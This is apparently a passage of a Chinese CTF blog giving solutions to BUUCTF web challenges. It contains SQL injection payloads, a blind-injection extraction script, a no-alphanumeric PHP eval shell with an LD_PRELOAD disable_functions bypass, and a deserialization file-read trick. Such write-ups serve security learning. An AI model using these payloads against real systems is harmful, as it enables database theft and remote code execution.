&lt;h2 id=&#34;极客大挑战-2019hardsql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019hardsql&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] HardSQL&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;报错注入，payload&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;username&lt;/span&gt;=admin&amp;amp;password=admin%&lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;^extractvalue(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;e,(select(right((password),&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;))from(H&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;rDsq&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))))%&lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;flag 用 left 和 right 函数拼接&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;极客大挑战-2019finalsql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019finalsql&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] FinalSQL&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;题目提示盲注，测试 &lt;code&gt;/search.php?id=0^1&lt;/code&gt;  可以发现存在盲注点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://b766a75e-ee4f-41c7-847a-aac535a77c88.node3.buuoj.cn/search.php?id=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;i,j&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;#payload = url + &amp;quot;0^(ascii(substr((database()),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;.format(i,j) =&amp;gt;&amp;#x27;geek&amp;#x27;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;# payload = url + &amp;quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&amp;#x27;geek&amp;#x27;),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;.format(i,j)=&amp;gt;&amp;#x27;F1naI1y,Flaaaaag&amp;#x27;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;# payload = url + &amp;quot;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&amp;#x27;F1naI1y&amp;#x27;),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;.format(i,j)=&amp;gt;&amp;#x27;id,username,password&amp;#x27;&lt;/span&gt;&lt;br&gt;	payload = url + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0^(ascii(substr((select(group_concat(password))from(F1naI1y)),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;)&amp;quot;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;format&lt;/span&gt;(i,j)&lt;br&gt;	&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(payload)&lt;br&gt;	r = requests.get(payload)&lt;br&gt;	html = r.text&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Click&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; html:&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;find&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;	m1n = &lt;span class=&#34;hljs-number&#34;&gt;33&lt;/span&gt;&lt;br&gt;	m4x = &lt;span class=&#34;hljs-number&#34;&gt;126&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; m1n&amp;lt;=m4x:&lt;br&gt;		mid = (m1n+m4x)//&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; get(i,mid):&lt;br&gt;			m1n = mid+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;			m4x = mid-&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;chr&lt;/span&gt;((m1n+m4x+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)//&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)&lt;br&gt;&lt;br&gt;flag = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1000&lt;/span&gt;):&lt;br&gt;	a = find(i)&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; a==&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;!&amp;#x27;&lt;/span&gt;:&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;	flag += a&lt;br&gt;	&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(flag)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag:&amp;quot;&lt;/span&gt;,flag)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;极客大挑战-2019buyflag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019buyflag&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] BuyFlag&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;view-source:http://c54f9ea8-ba26-47fa-8c09-58a7a6868706.node3.buuoj.cn/pay.php&lt;/code&gt;  看到代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;];&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (is_numeric(&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;)) &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;password can&amp;#x27;t be number&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;	&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;elseif&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; == &lt;span class=&#34;hljs-number&#34;&gt;404&lt;/span&gt;) &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Password Right!&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;	&amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;money=1e15&amp;amp;password=404aaa&lt;/code&gt;  同时修改 cookie 的 user=0 变成 user=1 即可拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;极客大挑战-2019rce-me&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019rce-me&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] RCE ME&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;无数字、字母 shell，&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/a15803617402/article/details/83589181&#34;&gt;https://blog.csdn.net/a15803617402/article/details/83589181&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/news/186298.html&#34;&gt;https://www.freebuf.com/news/186298.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 LD_PRELOAD+without send_mail 绕过 disable_functions，调用’/readflag’拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;放个 payload&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;?code=&lt;span class=&#34;hljs-variable&#34;&gt;$_&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;`&amp;#123;&amp;#123;&amp;#123;&amp;quot;&lt;/span&gt;^&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;?&amp;lt;&amp;gt;/&amp;quot;&lt;/span&gt;;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;$_&amp;#125;&lt;/span&gt;[_](&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;$_&amp;#125;&lt;/span&gt;[__]);&amp;amp;_=assert&amp;amp;__=eval(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;])&amp;amp;cmd=&lt;span class=&#34;hljs-regexp&#34;&gt;/readflag&amp;amp;outpath=/&lt;/span&gt;var&lt;span class=&#34;hljs-regexp&#34;&gt;/tmp/&lt;/span&gt;a&amp;amp;sopath=&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;tmp/disable.so&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;网鼎杯-2018fakebook&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网鼎杯-2018fakebook&#34;&gt;#&lt;/a&gt; [网鼎杯 2018] Fakebook&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1&lt;/code&gt;  可能存在注入，用单引号测试发现报错。测试后发现是整型注入，尝试 &lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0^1&lt;/code&gt;  和 &lt;code&gt;0^0&lt;/code&gt;  注入成功&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;虽然可以盲注，但是还是比较麻烦，既然有报错就尝试报错注入：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20database())),1)&lt;/code&gt;  拿到了数据库名 =&amp;gt;“fakebook”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27)),1)&lt;/code&gt;  拿到表名 =&amp;gt;“users”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)),1)&lt;/code&gt;  拿到字段名 =&amp;gt;“no,username,passwd,data”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20substr(data,61,30)%20from%20fakebook.users)),1)&lt;/code&gt;  拿数据”1，m1n,3c9909afec25354d551dae21590bb2, &lt;code&gt;O:8:&amp;quot;UserInfo&amp;quot;:3:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:3:&amp;quot;m1n&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:18;s:4:&amp;quot;blog&amp;quot;;s:6:&amp;quot;m1n.me&amp;quot;;&amp;#125;&lt;/code&gt; “，发现一段反序列化的字符串。是我刚刚注册的信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不太懂有啥用，尝试扫后台，扫到 robots.txt，/user.php.bak 拿到源码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;构造 &lt;code&gt;http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0/**/union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&amp;#123;s:4:%22name%22;s:3:%22m1n%22;s:3:%22age%22;i:18;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&amp;#125;%27&lt;/code&gt;  就可以读到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;zjctf-2019nizhuansiwei&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#zjctf-2019nizhuansiwei&#34;&gt;#&lt;/a&gt; [ZJCTF 2019]NiZhuanSiWei&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;)&amp;amp;&amp;amp;(file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;welcome to the zjctf&amp;quot;&lt;/span&gt;))&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;&lt;/span&gt;.file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$text&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/flag/&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;))&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Not now!&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;(); &lt;br&gt;    &amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;);  &lt;span class=&#34;hljs-comment&#34;&gt;//useless.php&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;    highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第一层主要是考察 php 伪协议： &lt;code&gt;text=php://input&amp;amp;file=php://filter/read=convert.base64-encode/resource=useless.php&lt;/code&gt; , 同时 POST”welcome to the zjctf“，可以拿到 useless.php 源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Flag&lt;/span&gt;&lt;/span&gt;&amp;#123;  &lt;span class=&#34;hljs-comment&#34;&gt;//flag.php  &lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;;  &lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__tostring&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;  &lt;br&gt; 